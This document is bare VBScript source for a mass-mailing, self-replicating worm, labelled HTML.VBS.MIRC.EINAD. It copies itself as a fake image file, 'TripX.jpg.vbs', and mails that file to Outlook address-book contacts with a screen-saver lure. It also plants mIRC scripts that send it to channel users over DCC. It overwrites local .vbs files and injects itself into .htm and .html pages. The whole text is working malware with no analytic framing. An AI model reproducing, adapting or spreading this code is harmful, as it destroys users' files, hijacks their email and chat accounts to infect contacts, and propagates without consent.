on error resume next
Randomize timer
SC = "Scripting"
dot = "." 
f = "File"
s = "System"
Obj = "Object"
host = "c:\TripX.jpg.vbs"
Set FSO = CreateObject(sc & dot & f & s & obj)
lath = Wscript.ScriptFullName
fso.copyfile lath, host
mirc("c:\progra~1\mirc")
mirc("c:\progra~1\mirc32")
mirc("c:\mirc")
mirc("c:\mirc32")
infect("c:\")
infect("c:\windows")
infect(".")
infect("..")
outlook
Sub Outlook()
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 88 Then oo = d.AddressEntries.Count
Next 
c.Subject = "A free sample screen mate from www.screenmate4u.com"
c.Body = "Screen Mates"
c.Attachments.Add host
c.Send
e = ""
Next 
b.Logoff
End If
End Sub
Private sub mirc(mirca)
Set opn = fso.createtextfile(mirca & "\script.ini",1)
opn.writeline("n0=[SCRIPT]")
opn.writeline("n1=ON 1:JOIN:#: if ($nick != $me) { /dcc send $nick c:\TripX.jpg.vbs }")
opn.writeline("n2=ON 1:PART:#: if ($nick != $me) { /dcc send $nick c:\TripX.jpg.vbs }")
opn.close
end sub
Private sub infect(dir)
set opm = fso.opentextfile(lath,1)
vcode = opm.readall
opm.close
For Each target in FSO.GetFolder(dir).Files 
If ucase(fso.GetExtensionName(target.path))= "VBS" then 
set opm = fso.createtextfile(target.name,1)
opm.writeline vcode
opm.close
end if
If ucase(fso.GetExtensionName(target.path))= "HTM" then
set opm = fso.opentextfile(target.name,1)
code = opm.readall
opm.close
set opm = fso.opentextfile(target.name,2)
opm.writeline("<!--HTML.VBS.MIRC.EINAD-->")
opm.writeline("<SCRIPT language = " & chr(34) & "VBSCRIPT" & chr(34) & ">")
opm.writeline(vcode)
opm.writeline("<" & "/SCRIPT>")
opm.writeline(code)
opm.close
end if
if ucase(fso.GetExtensionName(target.path)) = "HTML" then 
set opm = fso.opentextfile(target.name,1)
code = opm.readall
opm.close
set opm = fso.opentextfile(target.name,2)
opm.writeline("<!--HTML.VBS.MIRC.EINAD-->")
opm.writeline("<SCRIPT language = " & chr(34) & "VBSCRIPT" & chr(34) & ">")
opm.writeline(vcode)
opm.writeline("<" & "/SCRIPT>")
opm.writeline(code)
opm.close
end if
Next
end sub










































